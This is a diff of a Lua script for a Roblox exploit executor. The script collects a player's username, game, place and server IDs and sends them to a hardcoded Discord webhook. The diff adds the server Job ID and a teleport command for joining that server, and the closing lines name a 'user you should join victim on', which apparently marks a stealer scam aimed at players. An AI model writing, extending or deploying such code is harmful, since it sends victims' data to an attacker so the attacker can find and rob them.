@@ -1,4 +1,4 @@
--- Ensure Http requests are supported by the exploit
+-- Ensure HTTP requests are supported by the exploit
 if not syn and not http and not request then
     print("Your executor does not support HTTP requests!")
     return
@@ -9,9 +9,11 @@ local webhookURL = "https://discord.com/api/webhooks/1335043376210247806/Gky6NvS
 
 -- Get Player & Game Info
 local player = game:GetService("Players").LocalPlayer
-local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local gameService = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+local gameName = gameService.Name
 local gameID = game.GameId
 local placeID = game.PlaceId
+local jobID = game.JobId -- Unique Server Instance ID
 
 -- Create Data for Webhook
 local data = {
@@ -26,10 +28,12 @@ local data = {
             {["name"] = "Executor", ["value"] = identifyexecutor and identifyexecutor() or "Unknown", ["inline"] = true},
             {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
             {["name"] = "Game ID", ["value"] = tostring(gameID), ["inline"] = true},
-            {["name"] = "Place ID", ["value"] = tostring(placeID), ["inline"] = true}
+            {["name"] = "Place ID", ["value"] = tostring(placeID), ["inline"] = true},
+            {["name"] = "Server Job ID", ["value"] = jobID, ["inline"] = false},
+            {["name"] = "Teleport to This Server", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeID .. ", '" .. jobID .. "')```", ["inline"] = false}
         }
     }},
-    ["allowed_mentions"] = {["parse"] = {"everyone"}} -- This enables the @everyone ping
+    ["allowed_mentions"] = {["parse"] = {"everyone"}} -- Enables the @everyone ping
 }
 
 -- Convert Data to JSON
@@ -60,7 +64,6 @@ elseif http and http.request then
 else
     print("No supported exploit functions found!")
 end
-
 
 _G.Username = "boondock138" -- user you should join victim on
 _G.min_value = 0.1
